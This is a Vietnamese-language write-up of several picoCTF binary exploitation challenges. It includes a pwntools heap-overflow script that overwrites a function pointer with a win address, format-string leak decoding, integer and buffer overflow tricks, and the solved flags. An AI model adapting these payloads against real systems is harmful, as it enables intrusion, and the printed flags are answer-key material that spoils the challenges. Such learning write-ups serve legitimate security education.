# heap 1
## Challenge
[link challenge](https://play.picoctf.org/practice/challenge/439?category=6&difficulty=2&page=1)
## Solution
- Bài này giống bài [heap 0](https://github.com/nhh9905/CTF/blob/main/picoCTF/Binary%20Exploitation/easy/writeup.md), tuy nhiên có sự khác biệt ở chỗ biến `safe_var` phải là chuỗi `pico` thì ta mới thu được flag
- Thực hiện `netcat` tới server
![alt text](https://github.com/nhh9905/CTF/blob/main/picoCTF/Binary%20Exploitation/medium/image-1.png)
## Flag
```picoCTF{starting_to_get_the_hang_9e9243f9}```
# heap 2
## Challenge
[link challenge](https://play.picoctf.org/practice/challenge/435?category=6&difficulty=2&page=1)
## Solution
- Đọc hàm `main` của file `chall.c`, ta vẫn thấy motip giống nhau đều là nhập `buffer` để làm tràn số, tuy nhiên bài này khó ở chỗ là chúng ta phải hiểu hàm `check_win`
```C
void check_win() { ((void (*)())*(int*)x)(); }
```
- Search chatgpt, tôi biết được rằng hàm này cho phép thực thi hàm `win` thông qua địa chỉ được lưu trong `x` hay nói cách khác `x` chính là địa chỉ của hàm `win`
-> Chúng ta phải đi tìm địa chỉ hàm `win`
- Sử dụng câu lệnh `objdump -D chall | grep win` ta thu được địa chỉ hàm win là `00000000004011a0`
![alt text](https://github.com/nhh9905/CTF/blob/main/picoCTF/Binary%20Exploitation/medium/image-2.png)
- Chúng ta phải chuyển địa chỉ hàm `win` sang `little-endian` để tiến hành viết payload. Lý do phải chuyển sang `little-endian` là vì:
![alt text](https://github.com/nhh9905/CTF/blob/main/picoCTF/Binary%20Exploitation/medium/image-3.png)
![alt text](https://github.com/nhh9905/CTF/blob/main/picoCTF/Binary%20Exploitation/medium/image-4.png)
- Viết payload để lấy flag:
```Python
from pwn import *

p = remote("mimas.picoctf.net", 51605)

payload = b'2'
p.sendlineafter(b"Enter your choice: ", payload)
payload = b'aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\xa0\x11\x40\x00\x00\x00\x00\x00'
p.sendlineafter(b"Data for buffer: ", payload)
payload = b'4'
p.sendlineafter(b"Enter your choice: ", payload)

p.interactive()
```
![alt text](https://github.com/nhh9905/CTF/blob/main/picoCTF/Binary%20Exploitation/medium/image-5.png)
## Flag
```picoCTF{and_down_the_road_we_go_91218226}```
# format string 1
## Challenge
[link challenge](https://play.picoctf.org/practice/challenge/434?category=6&difficulty=2&page=1)
## Solution
- Đọc qua file code `chall.c`, ta thấy bug ở dòng 36
```C
printf(buf);
```
- Đây là lỗ hổng `format string` khi in `buf` không đúng định dạng, dẫn tới việc có thể khai thác lỗ hổng thông qua dòng code đó
- Tiến hành `netcat` tới server, ta thu được chuỗi `hex`
![alt text](https://github.com/nhh9905/CTF/blob/main/picoCTF/Binary%20Exploitation/medium/image-6.png)
- Lấy đoạn `hex` sau `(nil)`, tiến hành loại bỏ những đoạn `hex` không có ý nghĩa và viết code thu được flag
```Python
hex = ["7b4654436f636970",
       "355f31346d316e34",
       "3478345f33317937",
       "35365f673431665f",
       "7d313464303935",]
print((bytes.fromhex(hex[0])[::-1] +
       bytes.fromhex(hex[1])[::-1] +
       bytes.fromhex(hex[2])[::-1] +
       bytes.fromhex(hex[3])[::-1] +
       bytes.fromhex(hex[4])[::-1]).decode())
```
## Flag
```picoCTF{4n1m41_57y13_4x4_f14g_65590d41}```
# two-sum
## Challenge
[link challenge](https://play.picoctf.org/practice/challenge/382?category=6&difficulty=2&page=1)
## Solution
- Đọc file code `flag.c`, ta thấy rằng để truy cập vào file `flag.txt` ta phải nhập 1 trong 2 số `num1` hoặc `num2` lớn hơn 0 và phải thỏa mãn tổng 2 số phải nhỏ hơn 0
- Nhận thấy `num1` và `num2` là kiểu dữ liệu `int` nên chúng ta có thể khai thác lỗ hổng tràn số thông qua kiểu dữ liệu
- Tiến hành `netcat` tới server, ta thu được flag
![alt text](https://github.com/nhh9905/CTF/blob/main/picoCTF/Binary%20Exploitation/medium/image-7.png)
## Flag
```picoCTF{Tw0_Sum_Integer_Bu773R_0v3rfl0w_ccd078bd}```
# Picker IV
## Challenge
[link challenge](https://play.picoctf.org/practice/challenge/403?category=6&difficulty=2&page=1)
## Solution
- Để lấy được flag, ta phải tìm địa chỉ hàm `win` và nhập địa chỉ vào biến `val`
```C
printf("Enter the address in hex to jump to, excluding '0x': ");
scanf("%x", &val);
printf("You input 0x%x\n", val);
void (*foo)(void) = (void (*)())val;
foo();
```
![alt text](https://github.com/nhh9905/CTF/blob/main/picoCTF/Binary%20Exploitation/medium/image-8.png)
## Flag
```picoCTF{n3v3r_jump_t0_u53r_5uppl13d_4ddr35535_01672a61}```
# buffer overflow 0
## Challenge
[link challenge]()
## Solution
- Ta thấy biến `buf1` có kích thước tối đa là 100 nên ta sẽ nhập 101 kí tự để xảy ra hiện tượng `SIGSEGV`, từ đó hàm `sigsegv_handler` được thực hiện
![alt text](https://github.com/nhh9905/CTF/blob/main/picoCTF/Binary%20Exploitation/medium/image-9.png)
## Flag
```picoCTF{ov3rfl0ws_ar3nt_that_bad_9f2364bc}```